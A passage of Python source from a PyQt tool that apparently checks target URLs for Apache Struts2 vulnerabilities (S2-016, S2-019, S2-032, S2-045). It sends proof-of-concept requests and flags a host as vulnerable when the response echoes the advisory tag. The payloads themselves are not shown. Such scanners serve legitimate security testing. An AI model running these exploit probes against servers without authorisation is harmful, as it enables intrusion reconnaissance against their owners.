                    pass

                try:
                    response = requests.get(url=url + '?' + poc['s2-016'], headers=headers, timeout=timeout)
                    if 'S2-016' in response.text and response.status_code == 200:  # 返回包如果出现S2-016和200响应码即表示存在漏洞
                        s16 = 1
                    else:
                        s16 = 0
                except Exception as out:
                    s16 = 0
                    pass

                try:
                    response = requests.get(url=url + '?' + poc['s2-019'], headers=headers, timeout=timeout)
                    if 'S2-019' in response.text and response.status_code == 200:  # 返回包如果出现S2-019和200响应码即表示存在漏洞
                        s19 = 1
                    else:
                        s19 = 0
                except Exception as out:
                    s19 = 0
                    pass

                try:
                    response = requests.get(url=url + '?' + poc['s2-032'], headers=headers, timeout=timeout)
                    if 'S2-032' in response.text and response.status_code == 200:  # 返回包如果出现S2-032和200响应码即表示存在漏洞
                        s32 = 1
                    else:
                        s32 = 0
                except Exception as out:
                    s32 = 0
                    pass

                try:
                    response = requests.get(url=url, headers=s2_045poc, timeout=timeout)
                    if 'S2-045' in response.text and response.status_code == 200:  # 返回包如果出现S2-045和200响应码即表示存在漏洞
                        s45 = 1
                    else:
                        s45 = 0
                except Exception as out:
                    s45 = 0
                    pass

                try:
                    result0 = 0
                    result1 = 0
                    res = s5+s8+s9+s16+s19+s32+s45
                    if res > 0:
                        print("[+]存在漏洞 | "+url)
                        result1 = result1 + 1
                    else:
                        print("[-]不存在 | "+url)
                        result0 = result0 + 1
                except Exception as out:
                    result0 = result0 + 1
                    print(out)


        return




if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    ui = mainGUI()
    ui.show()
    sys.exit(app.exec_())